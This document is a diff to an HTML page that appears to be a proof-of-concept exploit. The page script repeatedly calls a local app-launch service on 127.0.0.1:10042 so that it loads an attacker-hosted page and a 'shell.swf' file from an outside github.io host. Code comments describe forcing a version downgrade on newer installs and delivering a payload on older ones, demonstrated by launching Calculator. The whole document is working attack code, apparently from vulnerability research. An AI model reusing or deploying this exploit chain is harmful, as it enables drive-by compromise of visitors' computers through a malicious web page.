@@ -1,12 +1,18 @@
 <html><body>
-<p>Loading...</p>
+<p id="s">Loading...</p>
 <script>
-var img1 = new Image();
-img1.src = 'http://127.0.0.1:10042/launchApp?https://learningmanagerstage4.github.io/connect-poc/a.html?swfUrl=s.swf?aicc_url';
-
-setTimeout(function() {
-    var img2 = new Image();
-    img2.src = 'http://127.0.0.1:10042/launchApp?https://learningmanagerstage4.github.io/connect-poc/b.html?swfUrl=s.swf?aicc_url&t=' + Date.now();
-}, 90000);
+// Poll ConnectDetector every 10 seconds for 3 minutes
+// a.html is smart - it detects version:
+//   2026 → triggers downgrade
+//   2024 → delivers payload (Calculator)
+var count = 0;
+function fire() {
+    count++;
+    document.getElementById('s').innerText = 'Attempt ' + count + '...';
+    var img = new Image();
+    img.src = 'http://127.0.0.1:10042/launchApp?https://learningmanagerstage4.github.io/connect-poc/a.html?swfUrl=shell.swf?aicc_url&t=' + Date.now();
+    if (count < 18) setTimeout(fire, 10000);
+}
+fire();
 </script>
 </body></html>
